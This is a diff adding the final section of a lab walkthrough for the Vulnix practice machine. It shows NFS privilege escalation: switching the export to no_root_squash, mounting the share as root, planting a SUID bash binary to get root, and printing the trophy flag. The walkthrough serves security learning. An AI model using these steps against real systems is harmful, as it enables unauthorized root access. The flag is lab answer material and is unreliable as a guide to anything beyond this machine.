@@ -322,10 +322,59 @@ vulnix@vulnix:~$ sudoedit /etc/exports
 /home/vulnix    *(rw,root_squash)
 ```
 
-nfs has these to options :
+nfs has these two options :
 
 - root_squash : which does not allow the root use on the client to create file with root permissions (differentiates local root account with user root account)
 - no_root_squash : which allows root user on the client to create any file or binary with root permissions
 
+so we can simply change the line to `no_root_squash` and then restart the machine physically, this is the only option.
+
+so after booting up again we mount the `/home/vulnix` directory again but this time with our own root user :
+
+```bash
+root@kali: mount 192.168.127.134:/home/vulnix /mnt/vulnix
+root@kali: cd /mnt/vulnix
+```
+
+now we can put our own bash binary in to this shared folder and set SUID on it in order to run it on the victim machine :
+
+```bash
+root@kali(/mnt/vulnix): cp /bin/bash .
+root@kali: chmod 4777 bash
+root@kali: ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' vulnix@192.168.127.134
+vulnix@vulnix:~$ ./bash -p
+bash-4.2# id
+uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)
+```
+
+#### important :
+If you are using a 64bit kali machine you will get this error when executing bash on the target machine :
+
+`-bash: ./bash: cannot execute binary file`
+
+to resolve this you can just copy the vulnix machine bash binary (because it is 32bit version)
+
+to /home/vulnix first and then change the permission of it on your kali machine :
+
+```bash
+vulnix@vulnix:~$ cp /bin/bash .
+vulnix@vulnix:~$ exit
+root@kali: cd /mnt/vulnix
+root@kali: chown root:root bash
+root@kali: chmod 4777 bash
+```
+
+now if you execute the 32bit bash on victim it gives you the root account.
 
 
+navigate to `/root` :
+
+```bash
+bash-4.2# cd /root
+bash-4.2# ls
+trophy.txt
+bash-4.2# cat trophy.txt 
+cc614640424f5bd60ce5d5264899c3be
+```
+
+yes, this is how you can get the trophy from this machine :)
